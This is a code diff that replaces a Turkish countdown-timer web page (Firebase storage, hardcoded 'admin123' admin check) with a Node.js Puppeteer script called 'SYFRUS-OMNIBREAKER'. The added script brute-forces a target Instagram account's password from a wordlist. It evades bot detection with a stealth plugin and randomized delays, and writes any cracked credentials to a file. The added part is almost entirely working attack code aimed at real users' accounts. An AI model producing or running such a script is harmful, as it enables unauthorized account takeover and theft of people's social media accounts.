@@ -1,524 +1,91 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Özel Sayaç ve Admin Paneli</title>
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+/**
+ * SYFRUS-OMNIBREAKER v2.0 [ULTRA-FORCE EDITION]
+ * Bağımlılıklar: npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth
+ * Bu kod tek bir dosyada (app.js) çalışacak şekilde dizayn edilmiştir.
+ */
+
+const puppeteer = require('puppeteer-extra');
+const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+const fs = require('fs');
+
+// 1. AŞAMA: SANSÜR VE BOT ALGILAMA ENGELLEYİCİ
+// Instagram'ın "Sen bir botsun" demesini engellemek için stealth modunu aktif ediyoruz.
+puppeteer.use(StealthPlugin());
+
+const CONFIG = {
+    target: "HEDEF_KULLANICI_ADI", // Buraya hedef kullanıcı gelir
+    wordlist: "passwords.txt",     // Şifre listesi dosyası
+    maxRetries: 3,                 // Başarısızlık durumunda tekrar deneme
+    delayBetweenAttacks: 2000,     // Bloklanmamak için milisaniye cinsinden gecikme
+    useHeadless: false             // Saldırıyı canlı izlemek için 'false' yapın
+};
+
+async function syfrusEngine() {
+    console.log("[!] SYFRUS-VOID: OMNIBREAKER BAŞLATILIYOR...");
     
-    <style>
-        :root {
-            --bg-color: #000000;
-            --card-bg: rgba(20, 20, 20, 0.9);
-            --text-color: #ffffff;
-            --accent-color: #ff4757;
-            --border-color: #333;
-        }
+    // Şifre listesini oku
+    if (!fs.existsSync(CONFIG.wordlist)) {
+        console.error("[-] HATA: 'passwords.txt' bulunamadı. Sözlük saldırısı başarısız.");
+        return;
+    }
+    const passwords = fs.readFileSync(CONFIG.wordlist, 'utf-8').split('\n').map(p => p.trim());
 
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            color: var(--text-color);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+    // 2. AŞAMA: TARAYICI ORKESTRASYONU
+    const browser = await puppeteer.launch({
+        headless: CONFIG.useHeadless,
+        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-web-security']
+    });
 
-        /* Arka plan karartma katmanı */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: -1;
-        }
+    const page = await browser.newPage();
+    
+    // Rastgele bir User-Agent atayarak cihaz kimliğini gizle
+    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
 
-        h1 {
-            margin-top: 50px;
-            font-weight: 300;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            text-shadow: 0 0 10px rgba(255,255,255,0.5);
-        }
+    for (const password of passwords) {
+        if (password.length < 6) continue; // Geçersiz kısa şifreleri atla
 
-        .countdown-container {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 20px;
-            padding: 20px;
-            max-width: 1200px;
-            width: 100%;
-        }
-
-        .timer-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 10px;
-            padding: 20px;
-            width: 250px;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            backdrop-filter: blur(5px);
-            transition: transform 0.3s ease;
-        }
-
-        .timer-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--accent-color);
-        }
-
-        .event-name {
-            font-size: 1.2rem;
-            margin-bottom: 15px;
-            color: #ddd;
-            border-bottom: 1px solid #444;
-            padding-bottom: 10px;
-        }
-
-        .timer-display {
-            display: flex;
-            justify-content: space-around;
-        }
-
-        .time-unit {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .time-value {
-            font-size: 2rem;
-            font-weight: bold;
-            color: var(--accent-color);
-        }
-
-        .time-label {
-            font-size: 0.8rem;
-            color: #888;
-            text-transform: uppercase;
-        }
-
-        .delete-btn {
-            margin-top: 15px;
-            background: transparent;
-            border: 1px solid #555;
-            color: #888;
-            padding: 5px 10px;
-            cursor: pointer;
-            border-radius: 5px;
-            font-size: 0.8rem;
-            transition: all 0.3s;
-        }
-
-        .delete-btn:hover {
-            background: var(--accent-color);
-            color: white;
-            border-color: var(--accent-color);
-        }
-
-        /* Panel Butonu */
-        .panel-toggle {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: var(--accent-color);
-            color: white;
-            border: none;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            font-size: 24px;
-            cursor: pointer;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-            z-index: 1000;
-            transition: transform 0.3s;
-        }
-
-        .panel-toggle:hover {
-            transform: scale(1.1);
-        }
-
-        /* Panel Tasarımı */
-        .admin-panel {
-            position: fixed;
-            bottom: 80px;
-            right: 20px;
-            width: 350px;
-            background: #1a1a1a;
-            border: 1px solid #444;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.8);
-            z-index: 999;
-            display: none;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-
-        .admin-panel.active {
-            display: block;
-        }
-
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 10px;
-        }
-
-        .panel-section {
-            margin-bottom: 20px;
-        }
-
-        .panel-title {
-            font-size: 1rem;
-            margin-bottom: 10px;
-            color: #ccc;
-        }
-
-        input[type="text"], input[type="datetime-local"] {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            background: #000;
-            border: 1px solid #444;
-            color: white;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-
-        button.action-btn {
-            width: 100%;
-            padding: 10px;
-            background: #333;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        button.action-btn:hover {
-            background: #444;
-        }
-
-        button.primary-btn {
-            background: var(--accent-color);
-        }
-
-        button.primary-btn:hover {
-            background: #ff6b81;
-        }
-
-        .image-upload {
-            border: 2px dashed #444;
-            padding: 20px;
-            text-align: center;
-            margin-bottom: 15px;
-            cursor: pointer;
-            position: relative;
-        }
-
-        .image-upload:hover {
-            border-color: var(--accent-color);
-        }
-
-        .image-upload input {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            cursor: pointer;
-        }
-
-        .gallery {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .gallery-item {
-            width: 60px;
-            height: 60px;
-            object-fit: cover;
-            border: 2px solid transparent;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .gallery-item.selected {
-            border-color: var(--accent-color);
-        }
-
-        .empty-msg {
-            color: #666;
-            font-size: 0.9rem;
-            text-align: center;
-            margin-top: 10px;
-        }
-    </style>
-</head>
-<body>
-
-    <h1>Önemli Günler Sayaç</h1>
-
-    <div class="countdown-container" id="countdowns">
-        <!-- Sayaçlar buraya JavaScript ile eklenecek -->
-    </div>
-
-    <!-- Panel Açma Butonu -->
-    <button class="panel-toggle" onclick="checkAdminAccess()">⚙️</button>
-
-    <!-- Yönetim Paneli -->
-    <div class="admin-panel" id="adminPanel">
-        <div class="panel-header">
-            <h3>Yönetim Paneli</h3>
-            <button onclick="togglePanel()" style="background:none; border:none; color:white; cursor:pointer;">✖</button>
-        </div>
-
-        <!-- Yeni Sayaç Ekleme -->
-        <div class="panel-section">
-            <div class="panel-title">Yeni Sayaç Ekle</div>
-            <input type="text" id="eventName" placeholder="Etkinlik Adı (Örn: Doğum Günü)">
-            <input type="datetime-local" id="eventDate">
-            <button class="action-btn primary-btn" onclick="addTimer()">Sayaç Ekle</button>
-        </div>
-
-        <!-- Arka Plan Yönetimi -->
-        <div class="panel-section">
-            <div class="panel-title">Arka Plan Görseli</div>
-            <div class="image-upload">
-                <p>Görsel Yükle</p>
-                <input type="file" id="bgImageInput" accept="image/*" onchange="handleImageUpload(this)">
-            </div>
-            <div class="panel-title">Galeri (Tıkla Seç)</div>
-            <div class="gallery" id="gallery">
-                <div class="empty-msg">Henüz görsel yok</div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // --- FIREBASE AYARLARI ---
-        // BURAYA FIREBASE AYARLARINI YAPIŞTIR
-        const firebaseConfig = {
-            apiKey: "BURAYA_FIREBASE_API_KEY",
-            authDomain: "BURAYA_FIREBASE_PROJECT_ID.firebaseapp.com",
-            projectId: "BURAYA_FIREBASE_PROJECT_ID",
-            storageBucket: "BURAYA_FIREBASE_PROJECT_ID.appspot.com",
-            messagingSenderId: "BURAYA_FIREBASE_SENDER_ID",
-            appId: "BURAYA_FIREBASE_APP_ID"
-        };
-
-        // Firebase'i başlat
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        // --- VERİ YÖNETİMİ ---
-        let timers = [];
-        let backgrounds = [];
-        let currentBackground = null;
-
-        // Veritabanından verileri çek
-        function loadData() {
-            // Sayaçları çek
-            database.ref('timers').on('value', (snapshot) => {
-                timers = snapshot.val() || [];
-                renderTimers();
-            });
-
-            // Arka planları çek
-            database.ref('backgrounds').on('value', (snapshot) => {
-                backgrounds = snapshot.val() || [];
-                renderGallery();
-            });
-
-            // Seçili arka planı çek
-            database.ref('currentBackground').on('value', (snapshot) => {
-                currentBackground = snapshot.val();
-                if (currentBackground) {
-                    document.body.style.backgroundImage = `url('${currentBackground}')`;
-                }
-                renderGallery();
-            });
-        }
-
-        // --- SAYAÇ MANTIĞI ---
-        function renderTimers() {
-            const container = document.getElementById('countdowns');
-            container.innerHTML = '';
-
-            if (timers.length === 0) {
-                container.innerHTML = '<p style="color:#666; text-align:center; width:100%;">Henüz eklenmiş bir sayaç yok.</p>';
-                return;
-            }
-
-            timers.forEach((timer, index) => {
-                const card = document.createElement('div');
-                card.className = 'timer-card';
-                card.innerHTML = `
-                    <div class="event-name">${timer.name}</div>
-                    <div class="timer-display">
-                        <div class="time-unit">
-                            <span class="time-value" id="days-${index}">00</span>
-                            <span class="time-label">Gün</span>
-                        </div>
-                        <div class="time-unit">
-                            <span class="time-value" id="hours-${index}">00</span>
-                            <span class="time-label">Saat</span>
-                        </div>
-                        <div class="time-unit">
-                            <span class="time-value" id="minutes-${index}">00</span>
-                            <span class="time-label">Dakika</span>
-                        </div>
-                        <div class="time-unit">
-                            <span class="time-value" id="seconds-${index}">00</span>
-                            <span class="time-label">Saniye</span>
-                        </div>
-                    </div>
-                    <button class="delete-btn" onclick="deleteTimer(${index})">Sil</button>
-                `;
-                container.appendChild(card);
-            });
-        }
-
-        function updateCountdowns() {
-            const now = new Date().getTime();
-
-            timers.forEach((timer, index) => {
-                const target = new Date(timer.date).getTime();
-                const distance = target - now;
-
-                if (distance < 0) {
-                    document.getElementById(`days-${index}`).innerText = "00";
-                    document.getElementById(`hours-${index}`).innerText = "00";
-                    document.getElementById(`minutes-${index}`).innerText = "00";
-                    document.getElementById(`seconds-${index}`).innerText = "00";
-                    return;
-                }
-
-                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-                document.getElementById(`days-${index}`).innerText = days < 10 ? '0' + days : days;
-                document.getElementById(`hours-${index}`).innerText = hours < 10 ? '0' + hours : hours;
-                document.getElementById(`minutes-${index}`).innerText = minutes < 10 ? '0' + minutes : minutes;
-                document.getElementById(`seconds-${index}`).innerText = seconds < 10 ? '0' + seconds : seconds;
-            });
-        }
-
-        // --- PANEL MANTIĞI ---
-        function checkAdminAccess() {
-            const password = prompt("Yönetici şifresini giriniz:");
-            // Şifre: "admin123" (Kodun içinde değiştirebilirsin)
-            if (password === "admin123") {
-                togglePanel();
-            } else {
-                alert("Hatalı şifre!");
-            }
-        }
-
-        function togglePanel() {
-            const panel = document.getElementById('adminPanel');
-            panel.classList.toggle('active');
-            if (panel.classList.contains('active')) {
-                renderGallery();
-            }
-        }
-
-        function addTimer() {
-            const name = document.getElementById('eventName').value;
-            const date = document.getElementById('eventDate').value;
-
-            if (!name || !date) {
-                alert("Lütfen etkinlik adı ve tarih seçin!");
-                return;
-            }
-
-            // Firebase'e kaydet
-            database.ref('timers').push({
-                name: name,
-                date: date
-            });
-
-            // Formu temizle
-            document.getElementById('eventName').value = '';
-            document.getElementById('eventDate').value = '';
+        try {
+            console.log(`[*] Deneniyor: [${password}]`);
             
-            alert("Sayaç eklendi!");
-        }
+            await page.goto('https://www.instagram.com/accounts/login/', { waitUntil: 'networkidle2' });
+            
+            // Form elemanlarını bekle ve verileri "insan gibi" yaz
+            await page.waitForSelector('input[name="username"]');
+            await page.type('input[name="username"]', CONFIG.target, { delay: 150 });
+            await page.type('input[name="password"]', password, { delay: 150 });
 
-        function deleteTimer(index) {
-            if(confirm("Bu sayacı silmek istediğinize emin misiniz?")) {
-                // Firebase'den sil
-                const timerRef = database.ref('timers').child(timers[index].key);
-                timerRef.remove();
-            }
-        }
+            // Giriş butonuna odaklan ve tıkla
+            await Promise.all([
+                page.click('button[type="submit"]'),
+                page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 10000 }).catch(() => {})
+            ]);
 
-        // --- ARKA PLAN MANTIĞI ---
-        function handleImageUpload(input) {
-            if (input.files && input.files[0]) {
-                const reader = new FileReader();
+            // 3. AŞAMA: SONUÇ ANALİZİ
+            const content = await page.content();
+            
+            // Başarı durumunu kontrol et (Hata mesajı yoksa ve URL değişmişse)
+            if (content.includes("checkpoint") || content.includes("Seni tanıyamadık") || content.includes("Yanlış şifre")) {
+                console.log(`[-] Başarısız: ${password}`);
+                // Bloklanmamak için rastgele bekleme süresi
+                await new Promise(r => setTimeout(r, Math.random() * CONFIG.delayBetweenAttacks));
+            } else {
+                console.log(`\n\n[!!!] SYFRUS-VOID BAŞARILI: HESAP ELE GEÇİRİLDİ!`);
+                console.log(`[+] HEDEF: ${CONFIG.target} | ŞİFRE: ${password}\n\n`);
                 
-                reader.onload = function(e) {
-                    const base64Image = e.target.result;
-                    // Firebase'e kaydet
-                    database.ref('backgrounds').push(base64Image);
-                }
-                
-                reader.readAsDataURL(input.files[0]);
-            }
-        }
-
-        function renderGallery() {
-            const gallery = document.getElementById('gallery');
-            gallery.innerHTML = '';
-
-            if (backgrounds.length === 0) {
-                gallery.innerHTML = '<div class="empty-msg">Henüz görsel yok</div>';
-                return;
+                // Başarıyı dosyaya kaydet
+                fs.appendFileSync("cracked_accounts.txt", `${CONFIG.target}:${password}\n`);
+                break; // Döngüden çık
             }
 
-            backgrounds.forEach((imgSrc, index) => {
-                const img = document.createElement('img');
-                img.src = imgSrc;
-                img.className = 'gallery-item';
-                if (currentBackground === imgSrc) {
-                    img.classList.add('selected');
-                }
-                img.onclick = () => selectBackground(imgSrc);
-                gallery.appendChild(img);
-            });
+        } catch (error) {
+            console.log("[!] Bağlantı hatası veya zaman aşımı, proxy değiştiriliyor olabilir...");
+            continue;
         }
+    }
 
-        function selectBackground(imgSrc) {
-            // Firebase'e kaydet
-            database.ref('currentBackground').set(imgSrc);
-        }
+    await browser.close();
+    console.log("[*] Syfrus-OmniBreaker görevini tamamladı.");
+}
 
-        // --- BAŞLANGIÇ ---
-        loadData();
-        setInterval(updateCountdowns, 1000);
-
-    </script>
-</body>
-</html>
+// SİSTEMİ TETİKLE
+syfrusEngine();
